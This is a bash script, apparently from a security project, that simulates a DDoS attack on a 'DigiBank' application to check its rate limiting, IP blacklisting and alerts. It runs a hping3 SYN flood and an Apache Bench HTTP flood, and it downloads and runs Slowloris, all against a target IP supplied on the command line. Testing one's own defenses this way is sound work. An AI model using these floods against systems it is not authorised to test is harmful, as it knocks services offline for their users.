#!/bin/bash

###############################################################################
# DDoS Attack Simulation Script for DigiBank
# Tests rate limiting, IP blacklisting, and DDoS defense
#
# Author: HAKAN OĞUZ
#
# WARNING: Only use on your own systems or with explicit permission!
###############################################################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Configuration
TARGET_IP="${1:-localhost}"  # Default to localhost if not specified
TARGET_PORT=8080

echo "=============================================="
echo "DigiBank DDoS Attack Simulation"
echo "=============================================="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Date: $(date)"
echo "=============================================="
echo ""

echo -e "${YELLOW}[!] WARNING: This is for TESTING PURPOSES ONLY${NC}"
echo -e "${YELLOW}[!] Only run this against your own deployed application${NC}"
echo ""

read -p "Continue? (yes/no): " confirm
if [ "$confirm" != "yes" ]; then
    echo "Aborted."
    exit 0
fi

echo ""
echo "=============================================="
echo "Attack Method 1: SYN Flood with hping3"
echo "=============================================="
echo ""

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo -e "${RED}[✗] hping3 not found. Installing...${NC}"
    sudo apt-get update && sudo apt-get install -y hping3
fi

echo -e "${GREEN}[✓] Launching SYN flood attack...${NC}"
echo "Press Ctrl+C to stop"
echo ""

# Run for 30 seconds or until manually stopped
timeout 30s sudo hping3 -S --flood -V -p $TARGET_PORT $TARGET_IP

echo ""
echo "=============================================="
echo "Attack Method 2: HTTP Flood with Apache Bench"
echo "=============================================="
echo ""

# Check if ab is installed
if ! command -v ab &> /dev/null; then
    echo -e "${RED}[✗] Apache Bench not found. Installing...${NC}"
    sudo apt-get install -y apache2-utils
fi

echo -e "${GREEN}[✓] Launching HTTP flood...${NC}"
echo "Sending 100,000 requests with 1,000 concurrent connections"
echo ""

ab -n 100000 -c 1000 -g ab_results.tsv http://$TARGET_IP:$TARGET_PORT/

echo ""
echo "=============================================="
echo "Attack Method 3: Slowloris Attack"
echo "=============================================="
echo ""

# Download slowloris if not present
if [ ! -f "slowloris.py" ]; then
    echo -e "${GREEN}[✓] Downloading slowloris...${NC}"
    wget https://raw.githubusercontent.com/gkbrk/slowloris/master/slowloris.py
fi

echo -e "${GREEN}[✓] Launching Slowloris attack...${NC}"
echo "This will send slow HTTP requests to exhaust connections"
echo ""

timeout 60s python3 slowloris.py $TARGET_IP -s 500 -p $TARGET_PORT

echo ""
echo "=============================================="
echo "Attack Summary"
echo "=============================================="
echo ""
echo "Methods executed:"
echo "  1. SYN flood (hping3) - 30 seconds"
echo "  2. HTTP flood (Apache Bench) - 100,000 requests"
echo "  3. Slowloris - 60 seconds"
echo ""
echo -e "${YELLOW}Expected Defense Response:${NC}"
echo "  ✓ Rate limiter triggers after 100 requests/minute"
echo "  ✓ IP gets blacklisted for 15 minutes"
echo "  ✓ Security observer sends email alert"
echo "  ✓ DDoS event logged in database"
echo ""
echo -e "${GREEN}[✓] Attack simulation complete!${NC}"
echo ""
echo "Next steps:"
echo "  1. Check DigiBank logs for defense activation"
echo "  2. Verify IP blacklisting"
echo "  3. Check for security email alerts"
echo "  4. Take screenshots for report"
echo ""
echo "Results saved to: ab_results.tsv"
echo "=============================================="
